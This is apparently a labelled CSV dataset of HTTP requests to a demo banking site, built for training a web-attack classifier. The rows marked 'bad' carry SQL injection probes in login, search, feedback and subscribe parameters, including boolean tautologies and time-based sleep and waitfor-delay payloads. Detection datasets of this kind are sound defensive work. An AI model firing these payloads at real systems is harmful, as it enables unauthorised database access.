method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2B1-1-1=1%20AND%20000623=000623%20or%20'bkqL7jUZ'='&uid=e,4,0,0,0,6,1,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/default.jsp?content=-1'%20OR%202%2B371-371-1=0%2B0%2B0%2B1%20--%20,,1,0,1,0,4,0,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=CustomerServiceRepresentative:CustomerService,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp?HostName=Ha2sJgjn',,3,0,1,0,5,2,bad
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,,,0,4,0,0,4,0,bad
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp?step=-1%20OR%202%2B745-745-1=0%2B0%2B0%2B1,,0,0,0,0,2,0,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/search.jsp?query=-1%20OR%202%2B785-785-1=0%2B0%2B0%2B1%20--%20,,0,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=e,0,0,0,0,0,1,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
POST,/doLogin,GBYDCZAE',3,0,1,0,5,3,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,,0,2,0,5,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2B702-702-1=0%2B0%2B0%2B1%20--%20,0,0,1,0,4,0,bad
POST,/doLogin,,0,1,1,0,4,1,bad
POST,/doLogin,,0,1,1,0,4,1,bad
GET,/urchin.js,,0,0,0,0,0,0,good
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2B914-914-1=0%2B0%2B0%2B1%20or%20'QmbTa8Nm'='&uid=1,4,0,0,0,4,1,bad
GET,/index.jsp?content=JyI=&job=Teller:ConsumaerBanking,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=-1,2,0,1,0,7,2,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp?HostName=GMYMrVaD'),,1,0,1,1,3,2,bad
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=if(now()=sysdate()%2Csleep(10)%2C0),,0,0,0,4,0,1,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,,,0,2,0,5,0,1,bad
POST,/doLogin,,0,2,0,5,0,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=JyI=,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=-1%20OR%203%2B47-47-1=0%2B0%2B0%2B1&job=MortgageLendingAccountExecutive:Sales,,0,0,0,0,2,0,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/default.jsp?content=-1'%20OR%202%2B534-534-1=0%2B0%2B0%2B1%20or%20'0YUICOjh'=',,4,0,0,0,4,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp?sec=xmdti3a7')),,1,0,1,1,3,2,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
POST,/doLogin,-1'%20OR%202%2B589-589-1=0%2B0%2B0%2B1%20--%20&passw=g00dPa%24%24w0rD&uid=e,1,0,1,0,4,1,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=GMNI45Qd'),1,0,1,1,5,2,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp?sec=Careers&template=if(now()=sysdate()%2Csleep(6)%2C0),,0,0,0,4,0,1,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
POST,/doSubscribe,-1%20OR%202%2B373-373-1=0%2B0%2B0%2B1&txtEmail=sample%40email.tst,0,0,0,0,2,0,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
POST,/doLogin,,1,1,0,0,0,1,bad
GET,/index.jsp?content=if(now()=sysdate()%2Csleep(6)%2C0)&job=LoyaltyMarketingProgramManager:Marketing,,0,0,0,4,0,1,bad
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2B83-83-1=0%2B0%2B0%2B1&name=zFPWdwPk&subject=1,0,0,0,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2B861-861-1=0%2B0%2B0%2B1%20or%20'4GSqhy4M'=',4,0,0,0,4,1,bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1)),0,0,1,1,5,2,bad
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst'%20AND%202*3*8=6*8%20AND%20'FDmX'='FDmX&name=zFPWdwPk&subject=1,4,0,0,0,6,0,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=Teller:ConsumaerBanking,,0,0,0,0,0,0,good
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%20waitfor%20delay%20'0:0:9'%20--%20&subject=1,2,0,1,0,7,2,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_contact.htm,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/security.htm,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp?sec=Careers&template=8RwY1QnH',,3,0,1,0,5,2,bad
GET,/doLogin,,0,0,0,0,0,0,good
GET,,,2,2,0,0,0,0,bad
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,,,2,2,0,0,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=1%20waitfor%20delay%20'0:0:5'%20--%20,,2,0,1,0,5,2,bad
GET,/Privacypolicy.jsp?sec=JyI=&template=US,,0,0,0,0,0,0,good
POST,/sendFeedback,if(now()=sysdate()%2Csleep(9)%2C0)&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,0,0,0,4,0,1,bad
GET,/sendFeedback,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/default.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=v2hkXpoK',1,0,1,1,3,2,bad
GET,/survey_questions.jsp,,0,0,0,0,0,0,good
GET,/doSubscribe,,0,0,0,0,0,0,good
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst%25'%20AND%202*3*8=6*8%20AND%20'mU2R'!='mU2R%25,4,0,0,0,4,0,bad
POST,/sendFeedback,submit=%20Submit%20&cfile=comments.txt&comments=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,2,0,0,5,2,1,bad
GET,/index.jsp?content=6Fe2mSlv',,3,0,1,0,5,2,bad
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/index.jsp?content=48KlGBeM')),,1,0,1,1,3,2,bad
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/disclaimer.htm,,0,0,0,0,0,0,good
GET,/images/,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/Privacypolicy.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/doLogin,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,good
GET,/search.jsp,,0,0,0,0,0,0,good
POST,/doSubscribe,VwdrQmq7',3,0,1,0,5,2,bad
GET,,,0,2,0,5,0,1,bad
GET,/doSubscribe,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_jobs.htm&job=ZzDmd8LR',,3,0,1,0,5,2,bad
GET,/search.jsp,,0,0,0,0,0,0,good
